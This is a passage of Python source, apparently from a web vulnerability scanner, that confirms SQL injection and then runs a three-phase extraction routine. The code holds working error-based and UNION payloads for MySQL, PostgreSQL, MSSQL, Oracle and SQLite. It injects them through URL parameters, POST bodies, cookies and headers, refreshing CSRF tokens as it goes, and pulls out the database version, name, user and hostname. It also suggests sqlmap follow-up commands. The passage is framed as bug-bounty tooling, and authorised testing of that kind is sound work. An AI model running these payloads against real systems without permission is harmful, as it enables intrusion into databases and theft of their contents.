                            point, full_url, parsed, params, headers, cookies, body_params,
                            method, payload_name, payloads[payload_name]
                        )

                        if confirm_timed_out:
                            self.scan_progress.emit(
                                f"  ⚠️  Time-based [{db_name}]: {payload_name} — "
                                f"confirm probe TIMED OUT — not a valid DB delay, skipping"
                            )
                            continue

                        confirm_diff = confirm_elapsed - confirm_baseline

                        if confirm_diff >= required_diff:
                            results["vulnerable"] = True
                            results["db_fingerprint"] = db_name

                            detail = {
                                "db_type":          db_name,
                                "payload_name":     payload_name,
                                "payload":          payloads[payload_name],
                                "baseline_time":    round(current_baseline, 3),
                                "response_time":    round(elapsed, 3),
                                "time_difference":  round(time_diff, 3),
                                "confirm_baseline": round(confirm_baseline, 3),
                                "confirm_time":     round(confirm_elapsed, 3),
                                "confirm_diff":     round(confirm_diff, 3),
                                "expected_delay":   expected_delay,
                                "required_diff":    round(required_diff, 2)
                            }
                            results["details"].append(detail)
                            results["indicators"].append(
                                f"Time-based ({db_name}: +{time_diff:.2f}s, "
                                f"confirmed +{confirm_diff:.2f}s, "
                                f"baseline={current_baseline:.2f}s)"
                            )
                            self.scan_progress.emit(
                                f"  ✅ Time-based [{db_name}] CONFIRMED: {payload_name} — "
                                f"1st={elapsed:.2f}s (+{time_diff:.2f}s), "
                                f"2nd={confirm_elapsed:.2f}s (+{confirm_diff:.2f}s)"
                            )

                            # ── POC: extract DB version and name ─────────────────────
                            self.scan_progress.emit(
                                f"\n  🔬 Running POC extraction for confirmed {db_name} injection..."
                            )
                            poc_info = self._extract_sqli_poc(
                                db_name, point, full_url, parsed, params,
                                headers, cookies, body_params, method
                            )
                            if poc_info:
                                detail["poc"] = poc_info
                                self._emit_poc_block(poc_info)
                            break  # Confirmed for this DB — move on
                        else:
                            self.scan_progress.emit(
                                f"  ⚠️  Time-based [{db_name}]: {payload_name} — "
                                f"1st probe delayed (+{time_diff:.2f}s) but 2nd did NOT "
                                f"(+{confirm_diff:.2f}s < {required_diff:.2f}s) — likely server jitter, skipping"
                            )
                    else:
                        self.scan_progress.emit(
                            f"  — Time-based [{db_name}]: {payload_name} — "
                            f"elapsed={elapsed:.2f}s, diff=+{time_diff:.2f}s "
                            f"(need >{required_diff:.2f}s)"
                        )

        finally:
            # Always restore speed settings even if an exception occurs mid-phase
            self.scan_req_delay = _saved_delay
            self.scan_timeout   = _saved_timeout

        return results

    def _send_time_payload(self, point, full_url, parsed, params, headers, cookies, body_params,
                        method, payload_name, payload):
        """Send a single time-based payload and measure response time.

        Returns: (response, elapsed_seconds, timed_out: bool)
          - timed_out=True means a network/read timeout fired — the elapsed time
            reflects the connection timeout ceiling, NOT a genuine DB sleep, so
            the caller must DISCARD this result as a false positive.
          - timed_out=False means the server replied (possibly slowly) — elapsed
            is a genuine measurement and can be compared against the threshold.
        """
        import requests as _requests
        start_time = time.time()
        timed_out = False
        response = None
        try:
            if point["type"] == "URL Parameter":
                test_params = params.copy()
                test_params[point["name"]] = [point["original_value"] + payload]
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                
                response = self.send_request_with_traffic(
                    test_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method="GET",
                    payload=payload,
                    payload_type=f"SQLi-Time-{point['name']}-{payload_name}"
                )
            
            elif point["type"] == "POST Body":
                fresh_body_params, fresh_headers = self._with_fresh_csrf(
                    body_params, full_url, headers
                )
                test_body_params = fresh_body_params.copy()
                test_body_params[point["name"]] = [point["original_value"] + payload]

                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    test_body = json.dumps({k: v[0] for k, v in test_body_params.items()})
                else:
                    test_body = urllib.parse.urlencode(test_body_params, doseq=True)

                response = self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in fresh_headers.items() if k.lower() != 'host'},
                    method="POST",
                    body=test_body,
                    payload=payload,
                    payload_type=f"SQLi-Time-POST-{point['name']}-{payload_name}"
                )

            elif point["type"] == "Cookie":
                test_headers = self._build_cookie_headers(
                    headers, cookies,
                    target_name=point["name"],
                    new_value=point["original_value"] + payload
                )
                response = self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Time-Cookie-{point['name']}-{payload_name}"
                )
            
            else:  # HTTP Header
                test_headers = {k: v for k, v in headers.items() if k.lower() != 'host'}
                test_headers[point["name"]] = point["original_value"] + payload
                
                response = self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Time-Header-{point['name']}-{payload_name}"
                )

            elapsed = time.time() - start_time

            # ── Detect timeout disguised as a successful return ───────────────
            # Some wrappers catch the timeout internally and return an ErrorResponse
            # whose str representation contains the timeout error message.
            if response is not None:
                resp_str = str(getattr(response, 'text', '') or
                               getattr(response, '_error_msg', '') or
                               str(response))
                if any(kw in resp_str.lower() for kw in
                       ('read timed out', 'timed out', 'readtimeout',
                        'connectiontimeout', 'connecttimeout')):
                    timed_out = True

            return response, elapsed, timed_out

        except (_requests.exceptions.ReadTimeout,
                _requests.exceptions.ConnectTimeout,
                _requests.exceptions.Timeout) as e:
            # True network timeout — elapsed equals the timeout ceiling, not a DB delay.
            elapsed = time.time() - start_time
            logger.warning(f"Time payload TIMED OUT (not a valid delay signal): {e}")
            return self.ErrorResponse(str(e)), elapsed, True  # timed_out=True → caller discards

        except Exception as e:
            logger.warning(f"Time payload failed: {e}")
            return self.ErrorResponse(str(e)), 0, False

    def _extract_sqli_poc(self, db_name, point, full_url, parsed, params,
                           headers, cookies, body_params, method) -> dict:
        """
        POC extraction — proper 3-phase approach for bug-bounty-quality output.

        Phase A  Error-based (no column count needed)
                 EXTRACTVALUE / UPDATEXML / CAST / CONVERT leak data via DB error.
                 If any fire → record and skip UNION probing entirely.

        Phase B  Column-count detection (ORDER BY binary search → UNION NULL probe)
                 Determines the exact SELECT column count so UNION payloads match.
                 Probes up to MAX_COLS columns.

        Phase C  String-column detection + data extraction
                 Injects a unique sentinel string into each column slot in turn.
                 The first slot where the sentinel appears in the response body
                 is the "injectable" string column.  Then replaces the sentinel
                 with the real query (@@version, database(), user(), …) and
                 extracts the value from the response diff vs baseline.
        """
        import textwrap as _tw

        MAX_COLS  = 20          # maximum column count to probe
        SENTINEL  = "SQLITEST8x7z"   # unique enough to not appear naturally in any page

        # ── DB-specific data queries ─────────────────────────────────────────
        # Each DB engine gets its own set of field→query mappings.
        # These are pure SQL expressions (no surrounding payload) injected into
        # the confirmed string column slot.
        DB_QUERIES = {
            "MySQL": {
                "version":  "@@version",
                "db_name":  "database()",
                "db_user":  "user()",
                "hostname": "@@hostname",
                "data_dir": "@@datadir",
            },
            "MariaDB": {
                "version":  "@@version",
                "db_name":  "database()",
                "db_user":  "user()",
                "hostname": "@@hostname",
            },
            "PostgreSQL": {
                "version":  "version()",
                "db_name":  "current_database()",
                "db_user":  "current_user",
                "hostname": "inet_server_addr()::text",
            },
            "MSSQL": {
                "version":  "@@version",
                "db_name":  "DB_NAME()",
                "db_user":  "SYSTEM_USER",
                "hostname": "@@SERVERNAME",
            },
            "Oracle": {
                "version":  "(SELECT banner FROM v$version WHERE ROWNUM=1)",
                "db_name":  "(SELECT global_name FROM global_name)",
                "db_user":  "user",
                "hostname": "(SELECT host_name FROM v$instance)",
            },
            "SQLite": {
                "version":  "sqlite_version()",
                "db_name":  "(SELECT name FROM sqlite_master WHERE type=\'table\' LIMIT 1)",
                "db_user":  "NULL",   # SQLite has no users
            },
        }
        # Generic SQL / Unknown: try MySQL-style first, which works on MariaDB too
        DB_QUERIES["Generic SQL"] = DB_QUERIES["MySQL"]
        DB_QUERIES["Unknown"]     = DB_QUERIES["MySQL"]
        DB_QUERIES["Generic"]     = DB_QUERIES["MySQL"]

        # Error-based leak patterns (Phase A)
        LEAK_PATTERNS = [
            r"XPATH syntax error:\s*'~([^'~]{3,300})'",
            r"XPATH syntax error.*?'~?([^'~]{3,300})~?'",
            r'invalid input syntax for (?:type )?integer:\s*"([^"]{3,300})"',
            r"Conversion failed when converting the (?:varchar|nvarchar) value '([^']{3,300})' to data type int",
            r"ORA-\d+:[^\r\n]*[\r\n]+([^\r\n]{3,300})",
        ]

        # Error-based payloads per DB (Phase A)
        ERROR_PAYLOADS = {
            "MySQL": [
                ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {q}),0x7e))-- ",    "error-based"),
                ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT {q}),0x7e),1)-- ",     "error-based"),
            ],
            "MariaDB": [
                ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {q}),0x7e))-- ",    "error-based"),
                ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT {q}),0x7e),1)-- ",     "error-based"),
            ],
            "PostgreSQL": [
                ("' AND CAST((SELECT {q}) AS INTEGER)-- ",                      "error-based"),
                ("'||(SELECT CAST(({q}) AS VARCHAR(1)))--",                    "error-based"),
            ],
            "MSSQL": [
                ("' AND 1=CONVERT(INT, ({q}))-- ",                              "error-based"),
                ("'; SELECT {q}-- ",                                            "error-based"),
            ],
            "Oracle": [
                ("' AND 1=UTL_INADDR.get_host_address(({q}))-- ",              "error-based"),
                ("' AND CTXSYS.DRITHSX.SN(1,({q}))=1-- ",                      "error-based"),
            ],
            "SQLite": [
                ("' AND 1=CAST(({q}) AS INTEGER)-- ",                           "error-based"),
            ],
        }
        ERROR_PAYLOADS["Generic SQL"] = ERROR_PAYLOADS["MySQL"]
        ERROR_PAYLOADS["Unknown"]     = ERROR_PAYLOADS["MySQL"]
        ERROR_PAYLOADS["Generic"]     = ERROR_PAYLOADS["MySQL"]

        # ── Helper: send one payload and return (response, status, length, text)
        def _probe(payload_str):
            try:
                resp = self._send_error_payload(
                    point, full_url, parsed, params, headers, cookies,
                    body_params, method, "sqli_poc_probe", payload_str
                )
                if resp is None:
                    return None, 0, 0, ""
                status = getattr(resp, "status_code", 0)
                body   = getattr(resp, "content", b"") or b""
                text   = getattr(resp, "text", "") or ""
                return resp, status, len(body), text
            except Exception as e:
                logger.debug(f"POC probe error: {e}")
                return None, 0, 0, ""

        # ── Get clean baseline ────────────────────────────────────────────────
        def _baseline():
            try:
                if method == "POST":
                    ct = headers.get("Content-Type", "").lower()
                    body = (json.dumps({k: v[0] for k, v in body_params.items()})
                            if "application/json" in ct
                            else urllib.parse.urlencode(body_params, doseq=True))
                    r = self.send_request_with_traffic(
                        full_url,
                        {k: v for k, v in headers.items() if k.lower() != "host"},
                        method="POST", body=body, payload_type="SQLi-POC-Baseline"
                    )
                else:
                    r = self.send_request_with_traffic(
                        full_url,
                        {k: v for k, v in headers.items() if k.lower() != "host"},
                        method=method, payload_type="SQLi-POC-Baseline"
                    )
                if r:
                    return {
                        "status": getattr(r, "status_code", 0),
                        "length": len(getattr(r, "content", b"")),
                        "text":   getattr(r, "text", "") or "",
                    }
            except Exception:
                pass
            return {"status": 0, "length": 0, "text": ""}

        baseline = _baseline()
        b_status = baseline["status"]
        b_len    = baseline["length"]
        b_text   = baseline["text"]
        b_words  = set(re.findall(r"\b\w+\b", re.sub(r"<[^>]+>", " ", b_text)))

        # ── Build the URL with <PAYLOAD> marker for the report ────────────────
        try:
            if point["type"] == "URL Parameter":
                tp = params.copy()
                tp[point["name"]] = ["<PAYLOAD>"]
                qs = urllib.parse.urlencode(tp, doseq=True)
                poc_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
            else:
                poc_url = full_url
        except Exception:
            poc_url = full_url

        orig_val = point.get("original_value", "")

        poc = {
            "target_url":       poc_url,
            "injection_point":  point.get("display", point.get("name", "?")),
            "injection_type":   point.get("type", "?"),
            "parameter":        point.get("name", "?"),
            "original_value":   orig_val,
            "db_engine":        db_name,
            "detected_db_type": db_name,
            "technique":        None,
            "column_count":     None,
            "string_column":    None,
            "version":          None,
            "db_name":          None,
            "db_user":          None,
            "hostname":         None,
            "winning_payloads": {},
            "diffs":            {},
            "extraction_note":  None,
        }

        queries  = DB_QUERIES.get(db_name, DB_QUERIES["MySQL"])
        err_tmpl = ERROR_PAYLOADS.get(db_name, ERROR_PAYLOADS["MySQL"])

        # ════════════════════════════════════════════════════════════════════
        # PHASE A — Error-based extraction (works regardless of column count)
        # ════════════════════════════════════════════════════════════════════
        self.scan_progress.emit("  🔬 [POC] Phase A: trying error-based extraction...")

        for field_name, sql_expr in queries.items():
            if not self.running:
                break
            if sql_expr == "NULL":
                continue
            for tmpl, technique in err_tmpl:
                payload_str = tmpl.format(q=sql_expr)
                _, status, resp_len, resp_text = _probe(payload_str)

                is_error = (status == 0 or status >= 400 or
                            any(kw in resp_text.lower() for kw in (
                                "xpath syntax error", "extractvalue", "updatexml",
                                "ora-", "conversion failed", "invalid input syntax",
                                "sql syntax", "pg::", "sqlstate"
                            )))
                if not is_error:
                    continue

                for pat in LEAK_PATTERNS:
                    m = re.search(pat, resp_text, re.IGNORECASE | re.DOTALL)
                    if m:
                        val = m.group(1).strip()
                        if len(val) >= 3:
                            poc[field_name] = val[:300]
                            poc["winning_payloads"][field_name] = payload_str
                            poc["technique"] = "error-based"
                            poc["diffs"][field_name] = {
                                "payload":       payload_str.strip(),
                                "technique":     "error-based",
                                "status_before": b_status,
                                "status_after":  status,
                                "length_before": b_len,
                                "length_after":  resp_len,
                                "length_diff":   resp_len - b_len,
                            }
                            self.scan_progress.emit(
                                f"  ✅ [POC] Error-based: {field_name} = {val[:60]}"
                            )
                            break
                if poc.get(field_name):
                    break  # got this field

        # If all key fields extracted via error-based, skip UNION probing
        if all(poc.get(f) for f in ("version", "db_name", "db_user")):
            self.scan_progress.emit("  ✅ [POC] All fields extracted via error-based — skipping UNION phases")
            self._finalise_poc(poc)
            return poc

        # ════════════════════════════════════════════════════════════════════
        # PHASE B — Detect column count via ORDER BY binary search
        # ════════════════════════════════════════════════════════════════════
        self.scan_progress.emit("  🔬 [POC] Phase B: detecting column count (ORDER BY)...")

        col_count = None

        # ORDER BY binary search: find the highest N where ORDER BY N still gives 200
        lo, hi = 1, MAX_COLS
        last_ok = None
        while lo <= hi and self.running:
            mid = (lo + hi) // 2
            payload = f"' ORDER BY {mid}-- "
            _, status, resp_len, _ = _probe(payload)
            if status in range(200, 300):
                last_ok = mid
                lo = mid + 1
            else:
                hi = mid - 1

        if last_ok and last_ok >= 1:
            col_count = last_ok
            self.scan_progress.emit(f"  ✅ [POC] ORDER BY detected {col_count} column(s)")
        else:
            # Fallback: UNION SELECT NULL*N probe (200 = correct count)
            self.scan_progress.emit("  🔬 [POC] Phase B fallback: UNION NULL probing...")
            for n in range(1, MAX_COLS + 1):
                if not self.running:
                    break
                nulls   = ",".join(["NULL"] * n)
                payload = f"' UNION SELECT {nulls}-- "
                _, status, resp_len, _ = _probe(payload)
                if status in range(200, 300):
                    col_count = n
                    self.scan_progress.emit(f"  ✅ [POC] UNION NULL probe: {col_count} column(s)")
                    break

        if not col_count:
            self.scan_progress.emit(
                "  ⚠️  [POC] Could not determine column count (all probes returned 500). "
                "Vulnerability confirmed but UNION extraction not possible with auto-detection."
            )
            poc["extraction_note"] = (
                f"UNION-based extraction failed: could not determine column count (probed 1–{MAX_COLS}). "
                "The query may use unusual syntax or WAF may be filtering ORDER BY / UNION keywords. "
                "Vulnerability is confirmed by error-based / boolean detection. "
                f"Suggested next step: sqlmap -u '{poc_url.replace('<PAYLOAD>', orig_val)}' --technique=BU --level=3"
            )
            self._finalise_poc(poc)
            return poc

        poc["column_count"] = col_count

        # ════════════════════════════════════════════════════════════════════
        # PHASE C — Find visible string column + extract data
        # ════════════════════════════════════════════════════════════════════
        self.scan_progress.emit(
            f"  🔬 [POC] Phase C: finding visible string column (sentinel probe)..."
        )

        # Build a UNION payload with sentinel in position `slot`, NULLs elsewhere.
        # Oracle requires a FROM clause.
        from_clause = " FROM dual" if db_name == "Oracle" else ""

        string_col = None
        for slot in range(1, col_count + 1):
            if not self.running:
                break
            cols = []
            for i in range(1, col_count + 1):
                cols.append(f"'{SENTINEL}'" if i == slot else "NULL")
            payload = f"' UNION SELECT {','.join(cols)}{from_clause}-- "
            _, status, resp_len, resp_text = _probe(payload)

            if status not in range(200, 300):
                continue   # this slot didn't work (type mismatch)

            if SENTINEL in resp_text:
                string_col = slot
                self.scan_progress.emit(
                    f"  ✅ [POC] String column found: column {slot} of {col_count}"
                )
                break

        if string_col is None:
            self.scan_progress.emit(
                "  ⚠️  [POC] No visible string column found — "
                "UNION returns 200 but output not reflected in response."
            )
            poc["extraction_note"] = (
                f"UNION query succeeds ({col_count} columns confirmed) but output is not "
                "reflected in the HTTP response body. The application may discard query results. "
                "Boolean-blind or time-based extraction would be needed for full data retrieval. "
                f"Suggested: sqlmap -u '{poc_url.replace('<PAYLOAD>', orig_val)}' --technique=B --level=3"
            )
            poc["string_column"] = None
            self._finalise_poc(poc)
            return poc

        poc["string_column"] = string_col

        # ── Now extract each field by replacing sentinel with the real query ──
        self.scan_progress.emit("  🔬 [POC] Phase C: extracting DB data...")

        for field_name, sql_expr in queries.items():
            if not self.running:
                break
            if poc.get(field_name):
                continue   # already got from Phase A
            if sql_expr == "NULL":
                poc[field_name] = "N/A (not applicable for this DB)"
                continue

            cols = []
            for i in range(1, col_count + 1):
                cols.append(sql_expr if i == string_col else "NULL")
            payload = f"' UNION SELECT {','.join(cols)}{from_clause}-- "

            _, status, resp_len, resp_text = _probe(payload)
            if status not in range(200, 300):
                continue

            # Extract injected value: look for NEW content vs baseline
            # Strategy: strip HTML, find tokens in response not in baseline,
            # then try to find the longest contiguous new string near the
            # injection position (where sentinel appeared).
            plain_resp = re.sub(r"<[^>]+>", " ", resp_text)
            resp_words = set(re.findall(r"\b\w+\b", plain_resp))
            new_words  = resp_words - b_words

            extracted = None

            # For version: look for version-string pattern in new content only
            if field_name == "version":
                # Build a reduced string with only "new" context
                # Find spans around new tokens to reconstruct the version string
                candidates = re.findall(
                    r"(\d+\.\d+[\d\.]*(?:[-_][A-Za-z0-9\.]+)*(?:\s+\([^)]{3,60}\))?)",
                    plain_resp
                )
                valid = [c for c in candidates
                         if set(re.findall(r"\b\w+\b", c)) & new_words]
                if valid:
                    extracted = max(valid, key=len).strip()[:300]

            elif field_name in ("db_name", "db_user", "hostname", "data_dir"):
                # For user@host form (db_user)
                m = re.search(r"\b([A-Za-z0-9_.\-]+@[A-Za-z0-9_.\-]+)\b", plain_resp)
                if m and m.group(1).split("@")[0] in new_words:
                    extracted = m.group(1)[:200]

                if not extracted:
                    # Find any new meaningful token
                    for tok in sorted(new_words, key=len, reverse=True):
                        if (len(tok) >= 2
                                and not tok.isdigit()
                                and tok.lower() not in {
                                    "html", "head", "body", "div", "span", "class", "style",
                                    "script", "href", "src", "type", "name", "value", "input",
                                    "form", "table", "tr", "td", "th", "li", "ul", "ol",
                                    "link", "meta", "title", "true", "false", "null", "none",
                                    "doctype", "charset", "content", "http", "https", "lang",
                                    "text", "data", "page", "main", "nav", "header", "footer",
                                    "section", "button", "label", "select", "option",
                                    "width", "height", "color", "font", "display", "flex",
                                    "block", "inline", "hidden", "active", "disabled",
                                }):
                            extracted = tok[:200]
                            break

            if extracted:
                poc[field_name] = extracted
                poc["winning_payloads"][field_name] = payload.strip()
                poc["technique"] = poc["technique"] or "union-based"
                poc["diffs"][field_name] = {
                    "payload":       payload.strip(),
                    "technique":     "union-based",
                    "status_before": b_status,
                    "status_after":  status,
                    "length_before": b_len,
                    "length_after":  resp_len,
                    "length_diff":   resp_len - b_len,
                }
                self.scan_progress.emit(
                    f"  ✅ [POC] union-based: {field_name} = {extracted[:60]}"
                )

        # ── Extraction note if nothing came through ───────────────────────────
        if not any(poc.get(f) for f in ("version", "db_name", "db_user")):
            poc["extraction_note"] = (
                f"Column count confirmed ({col_count}), string column confirmed ({string_col}), "
                "but extracted values were indistinguishable from baseline page content. "
                "The application may encode or sanitise output before rendering. "
                f"Suggested: sqlmap -u '{poc_url.replace('<PAYLOAD>', orig_val)}' --technique=U --level=3"
            )

        self._finalise_poc(poc)
        return poc

    def _finalise_poc(self, poc: dict):
        """Post-process: refine detected_db_type from extracted version string."""
        version = poc.get("version", "") or ""
        if version:
            v = version.lower()
            if   "mariadb"              in v: poc["detected_db_type"] = "MariaDB"
            elif "mysql"                in v: poc["detected_db_type"] = "MySQL"
            elif "postgresql" in v or "pg " in v: poc["detected_db_type"] = "PostgreSQL"
            elif "microsoft sql server" in v: poc["detected_db_type"] = "MSSQL"
            elif "oracle"               in v: poc["detected_db_type"] = "Oracle"
            elif "sqlite"               in v: poc["detected_db_type"] = "SQLite"

        if poc.get("technique") is None:
            if any(poc.get(f) for f in ("version", "db_name", "db_user")):
                poc["technique"] = "mixed"


    def _emit_poc_block(self, poc: dict):
        """
        Emit a detailed, formatted POC block to the scan progress log.

        Layout:
        ╔══════════════════════════════════════════════════════════════════════╗
        ║              💀 SQL INJECTION — PROOF OF CONCEPT                    ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║  TARGET                                                             ║
        ║  URL            : https://example.com/filter?category=<PAYLOAD>    ║
        ║  Injection Point: 📍 URL: category                                 ║
        ║  Parameter      : category  (original value: "Gifts")              ║
        ║  DB Engine      : MySQL                                             ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║  📊 EXTRACTED DATA                                                  ║
        ║  Version        : 8.0.42-0ubuntu0.20.04.1                          ║
        ║  DB Name        : users_db                                         ║
        ║  DB User        : webapp@localhost                                  ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║  🔧 WINNING PAYLOAD — version  (error-based)                        ║
        ║  Payload        : ' AND EXTRACTVALUE(1,CONCAT(0x7e,...))--         ║
        ║  Full value     : category=' AND EXTRACTVALUE(...)--               ║
        ║  Before         : HTTP 200  |  length=4523 bytes                   ║
        ║  After          : HTTP 500  |  length=4891 bytes  (+368 bytes)     ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║  🔧 WINNING PAYLOAD — db_name  (union-based)                        ║
        ║  ...                                                                ║
        ╚══════════════════════════════════════════════════════════════════════╝
        """
        W    = 72  # inner width (between the ║ borders)
        LINE = "═" * W
        emit = self.scan_progress.emit

        def _pad(text: str) -> str:
            """Pad text to fill the inner width, add right border."""
            text = str(text)
            if len(text) > W:
                text = text[:W - 3] + "..."
            return f"║{text:<{W}}║"

        def _row(label: str, value: str) -> str:
            label_col = f"  {label:<16}: "
            avail = W - len(label_col)
            value = str(value or "")
            if len(value) > avail:
                value = value[:avail - 3] + "..."
            return f"║{label_col}{value:<{avail}}║"

        def _section(title: str):
            emit(f"╠{LINE}╣")
            emit(_pad(f"  {title}"))

        # ══════════════════════ HEADER ════════════════════════════════════════
        emit(f"\n╔{LINE}╗")
        emit(_pad(f"{'💀  SQL INJECTION — PROOF OF CONCEPT':^{W}}"))
        emit(f"╠{LINE}╣")

        # ── TARGET section ────────────────────────────────────────────────────
        emit(_pad("  🎯 TARGET"))
        emit(_row("URL",           poc.get("target_url", "?")))
        emit(_row("Inj. Point",    poc.get("injection_point", "?")))
        orig = poc.get("original_value", "")
        param_line = poc.get("parameter", "?")
        if orig:
            param_line += f'  (original value: "{orig}")'
        emit(_row("Parameter",     param_line))

        # Show detected DB type — if refined from version string, show both
        db_engine   = poc.get("db_engine", "?")
        detected_db = poc.get("detected_db_type", db_engine)
        if detected_db and detected_db != db_engine and db_engine not in ("Generic SQL", "Unknown", "Generic"):
            emit(_row("DB Engine",     f"{db_engine}  →  confirmed: {detected_db}"))
        else:
            emit(_row("DB Engine",     detected_db or db_engine))

        emit(_row("Technique",     poc.get("technique", "unknown")))

        # ── EXTRACTED DATA section ────────────────────────────────────────────
        has_data = any(poc.get(f) for f in ("version", "db_name", "db_user", "hostname"))
        _section("📊 EXTRACTED DATA")
        if has_data:
            if poc.get("version"):
                emit(_row("Version",  poc["version"]))
            if poc.get("db_name"):
                emit(_row("DB Name",  poc["db_name"]))
            if poc.get("db_user"):
                emit(_row("DB User",  poc["db_user"]))
            if poc.get("hostname"):
                emit(_row("Hostname", poc["hostname"]))
        else:
            note = poc.get("extraction_note", "")
            if note:
                # Wrap note into lines of max W-4 chars
                import textwrap as _tw
                emit(_pad("  ⚠️  EXTRACTION FAILED — Vulnerability IS confirmed but data"))
                emit(_pad("      could not be pulled via the probes tried. Reason:"))
                for ln in _tw.wrap(note, W - 6):
                    emit(_pad(f"      {ln}"))
            else:
                emit(_pad("  ⚠️  No data extracted via error/union channel."))
                emit(_pad("      Blind-only target — time-based delay confirmed injection only."))
                emit(_pad("      Use sqlmap --technique=T or manual blind extraction for full PoC."))

        # ── Per-field WINNING PAYLOAD + DIFF sections ─────────────────────────
        diffs   = poc.get("diffs", {})
        winning = poc.get("winning_payloads", {})

        for field_name in ("version", "db_name", "db_user", "hostname", "data_dir", "tables"):
            if field_name not in winning:
                continue
            payload_str = winning[field_name]
            diff        = diffs.get(field_name, {})
            technique   = diff.get("technique", poc.get("technique", "?"))
            orig_val    = poc.get("original_value", "")

            _section(f"🔧 WINNING PAYLOAD — {field_name}  ({technique})")

            emit(_row("Payload",    payload_str.strip()))
            full_val = f"{orig_val}{payload_str.strip()}" if orig_val else payload_str.strip()
            emit(_row("Full value", full_val))

            sb     = diff.get("status_before",  "?")
            sa     = diff.get("status_after",   "?")
            lb     = diff.get("length_before",  "?")
            la     = diff.get("length_after",   "?")
            ld     = diff.get("length_diff",    "?")
            ld_str = (f"+{ld}" if isinstance(ld, int) and ld >= 0 else str(ld)) if ld != "?" else "?"
            emit(_row("Before",     f"HTTP {sb}  |  {lb} bytes"))
            emit(_row("After",      f"HTTP {sa}  |  {la} bytes  ({ld_str} bytes)"))

        emit(f"╚{LINE}╝\n")

    def _test_union_based(self, point, full_url, parsed, params, headers, cookies, body_params,
                          method, baseline_length, payloads):
        """Test for union-based SQL injection"""
        results = {
            "vulnerable": False,
            "details": [],
            "indicators": []
        }
        
        # Use ThreadPoolExecutor for parallel testing if boost mode is enabled
        if self.boost_mode:
            import threading as _threading
            _union_cancel = _threading.Event()

            def _union_worker(payload_name, payload, _c=_union_cancel):
                if _c.is_set():
                    return None
                return self._send_union_payload(
                    point, full_url, parsed, params, headers, cookies, body_params,
                    method, payload_name, payload
                )

            with concurrent.futures.ThreadPoolExecutor(max_workers=getattr(self, "scan_max_workers", 8)) as executor:
                futures = {}
                for payload_name, payload in payloads.items():
                    if not self.running or _union_cancel.is_set():
                        break
                    futures[executor.submit(_union_worker, payload_name, payload)] = (payload_name, payload)
                
                for future in concurrent.futures.as_completed(futures):
                    if results["vulnerable"] and self.scan_stop_on_first:
                        _union_cancel.set()
                        break
                    payload_name, payload = futures[future]
                    try:
                        response = future.result(timeout=15)
                        if response:
                            response_length = len(response.content)
                            length_diff = response_length - baseline_length

                            relative_increase = length_diff / max(baseline_length, 1)
                            if length_diff >= 200 and relative_increase >= 0.15:
                                results["vulnerable"] = True
                                detail = {
                                    "payload_name": payload_name,
                                    "payload": payload,
                                    "baseline_length": baseline_length,
                                    "response_length": response_length,
                                    "length_increase": length_diff,
                                    "relative_increase_pct": round(relative_increase * 100, 1),
                                    "status_code": response.status_code
                                }
                                results["details"].append(detail)
                                results["indicators"].append(
                                    f"Union-based (+{length_diff}b, +{relative_increase*100:.1f}%)"
                                )
                                self.scan_progress.emit(
                                    f"  ✅ Union-based: {payload_name} — "
                                    f"response grew by {length_diff}b (+{relative_increase*100:.1f}%)"
                                )
                                if self.scan_stop_on_first:
                                    _union_cancel.set()
                    except Exception as e:
                        continue
        else:
            # Sequential testing
            for payload_name, payload in payloads.items():
                if not self.running:
                    break
                
                response = self._send_union_payload(
                    point, full_url, parsed, params, headers, cookies, body_params,
                    method, payload_name, payload
                )
                
                if response:
                    response_length = len(response.content)
                    length_diff = response_length - baseline_length

                    # Normalised threshold: require ≥15% relative increase AND ≥200 bytes absolute.
                    relative_increase = length_diff / max(baseline_length, 1)
                    if length_diff >= 200 and relative_increase >= 0.15:
                        results["vulnerable"] = True
                        detail = {
                            "payload_name": payload_name,
                            "payload": payload,
                            "baseline_length": baseline_length,
                            "response_length": response_length,
                            "length_increase": length_diff,
                            "relative_increase_pct": round(relative_increase * 100, 1),
                            "status_code": response.status_code
                        }
                        results["details"].append(detail)
                        results["indicators"].append(
                            f"Union-based (+{length_diff}b, +{relative_increase*100:.1f}%)"
                        )
                        self.scan_progress.emit(
                            f"  ✅ Union-based: {payload_name} — "
                            f"response grew by {length_diff}b (+{relative_increase*100:.1f}%)"
                        )
                        break
        
        return results
    
    def _send_union_payload(self, point, full_url, parsed, params, headers, cookies, body_params,
                            method, payload_name, payload):
        """Send a single union-based payload — handles all injection point types."""
        try:
            if point["type"] == "URL Parameter":
                test_params = params.copy()
                test_params[point["name"]] = [point["original_value"] + payload]
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                
                return self.send_request_with_traffic(
                    test_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method="GET",
                    payload=payload,
                    payload_type=f"SQLi-Union-{point['name']}-{payload_name}"
                )
            
            elif point["type"] == "POST Body":
                fresh_body_params, fresh_headers = self._with_fresh_csrf(
                    body_params, full_url, headers
                )
                test_body_params = fresh_body_params.copy()
                test_body_params[point["name"]] = [point["original_value"] + payload]

                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    test_body = json.dumps({k: v[0] for k, v in test_body_params.items()})
                else:
                    test_body = urllib.parse.urlencode(test_body_params, doseq=True)

                return self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in fresh_headers.items() if k.lower() != 'host'},
                    method="POST",
                    body=test_body,
                    payload=payload,
